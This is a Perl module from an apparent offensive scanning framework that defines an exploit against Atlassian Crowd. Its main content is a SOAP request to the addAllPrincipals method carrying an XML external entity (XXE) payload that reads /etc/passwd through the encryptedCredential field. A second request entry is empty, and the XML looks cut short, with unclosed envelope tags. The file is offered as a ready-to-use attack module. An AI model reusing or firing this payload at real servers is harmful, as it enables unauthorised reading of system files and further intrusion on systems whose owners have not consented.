package P1rK3r::Exploits::ATLASSIAN::MSF::AtlassianCrowdFileaccess;
use parent qw(P1rK3r::Exploit P1rK3r::Services::ATLASSIAN);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "AtlassianCrowdFileaccess";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'SCANNER',
        REQUESTS => {
                EXPLOIT6 => {
                        METHOD       => 'GET',
                        PATH         => '',
                        PAYLOAD      => '',
                        TEXT         => 'Sending Exploit #6 Request : [GET] ',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => '<!DOCTYPE foo [<!ENTITY eNyQQ SYSTEM "file:///etc/passwd"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SecurityServer" xmlns:aut="http://authentication.integration.crowd.atlassian.com" xmlns:soap="http://soap.integration.crowd.atlassian.com">
<soapenv:Header/>
<soapenv:Body>
<urn:addAllPrincipals>
<urn:in0>
<!--Optional:-->
<aut:name>?</aut:name>
<!--Optional:-->
<aut:token>?</aut:token>
</urn:in0>
<urn:in1>
<!--Zero or more repetitions:-->
<soap:SOAPPrincipalWithCredential>
<!--Optional:-->
<soap:passwordCredential>
<!--Optional:-->
<aut:credential>?</aut:credential>
<!--Optional:-->
<aut:encryptedCredential>?&eNyQQ;</aut:encryptedCredential>
</soap:passwordCredential>
<!--Optional:-->
<soap:principal>
<!--Optional:-->
<soap:ID>?</soap:ID>
<!--Optional:-->
<soap:active>?</soap:active>
<!--Optional:-->
<soap:attributes>
<!--Zero or more repetitions:-->
<soap:SOAPAttribute>
<!--Optional:-->
<soap:name>?</soap:name>
<!--Optional:-->
<soap:values>
<!--Zero or more repetitions:-->
<urn:string>?</urn:string>
</soap:values>
</soap:SOAPAttribute>
</soap:attributes>
',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /',
                        HEADERS      => {
                           'SOAPAction' => '""',
                           'Content-Type' => 'text/xml; charset=UTF-8',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
